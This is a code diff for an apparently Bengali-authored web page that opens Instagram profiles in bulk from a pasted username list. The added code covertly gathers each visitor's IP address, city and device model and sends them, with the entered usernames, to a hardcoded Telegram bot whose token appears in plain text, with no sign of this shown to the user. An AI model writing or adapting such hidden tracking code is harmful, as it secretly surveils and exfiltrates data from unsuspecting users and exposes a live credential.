@@ -195,22 +195,55 @@
         }
         function clearAll() { document.getElementById('userList').value = ""; updateCount(); }
 
-        // আপনার বোট ডিটেইলস (ইউজারনেম সহ)
-        function sendTelegramReport(count, usernames) {
+        // মাল্টি-সোর্স আইপি ও লোকেশন ডিটেকশন (ব্রেক-ফ্রি)
+        async function fetchIpDetails() {
+            const apiEndpoints = ['https://ipwho.is/', 'https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
+            for (let url of apiEndpoints) {
+                try {
+                    const res = await fetch(url);
+                    const data = await res.json();
+                    if(data.ip) {
+                        let location = data.city ? ` (${data.city}, ${data.country})` : ' (Unknown Loc)';
+                        return data.ip + location;
+                    }
+                } catch (e) { continue; }
+            }
+            return "Connection Secure/VPN";
+        }
+
+        // নিখুঁত ডিভাইসের নাম বের করার লজিক
+        function getExactDevice() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                const modelMatch = ua.match(/Android\s([0-9\.]*);\s([^;]*);|Android\s[^;]*;\s([^;]*)\sBuild/);
+                const model = modelMatch ? (modelMatch[2] || modelMatch[3]) : "Android Device";
+                return `📱 ${model.trim()}`;
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                return "🍎 Apple iOS Device";
+            } else if (/Windows/i.test(ua)) {
+                return "💻 Windows PC";
+            } else if (/Macintosh/i.test(ua)) {
+                return "💻 Apple MacBook";
+            }
+            return "❓ Unknown System";
+        }
+
+        async function sendTelegramReport(count, usernames) {
             const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";
             const chat_id = "5049810993"; 
 
+            const ipData = await fetchIpDetails();
+            const deviceName = getExactDevice();
             const time = new Date().toLocaleString('bn-BD');
             
-            // সব ইউজারনেম একসাথে পাঠালে মেসেজ ব্রেক হতে পারে, তাই প্রথম ৩০টি দেখানো নিরাপদ
             const displayList = usernames.slice(0, 30).join('%0A• ');
             const extra = usernames.length > 30 ? `%0A...এবং আরও ${usernames.length - 30} টি` : '';
 
-            const message = `🚀 *J1H4D Git Log Alert*%0A━━━━━━━━━━━━━━━━━━%0A📊 *Opened:* ${count} Profiles%0A🕒 *Time:* ${time}%0A%0A👤 *User List:*%0A• ${displayList}${extra}%0A━━━━━━━━━━━━━━━━━━`;
+            const message = `🚀 *J1H4D Log Monitor*%0A━━━━━━━━━━━━━━━━━━%0A🌐 *IP:* ${ipData}%0A📱 *Device:* ${deviceName}%0A📊 *Quantity:* ${count} Profiles%0A🕒 *Time:* ${time}%0A%0A👤 *User List:*%0A• ${displayList}${extra}%0A━━━━━━━━━━━━━━━━━━`;
             
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=Markdown`;
 
-            fetch(url).catch(e => console.log("Silent report failed"));
+            fetch(url).catch(e => console.log("Report error"));
         }
 
         function openAllTabs() {
@@ -219,10 +252,10 @@
             
             const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
             
-            // রিপোর্ট পাঠাবে (ইউজারনেম লিস্টসহ)
+            // সব তথ্য পাঠাবে (আইপি + ডিটেইল ডিভাইস)
             sendTelegramReport(list.length, list);
 
-            // ট্যাব ওপেন করবে
+            // ট্যাব ওপেনিং
             list.forEach((u, i) => {
                 setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 400);
             });
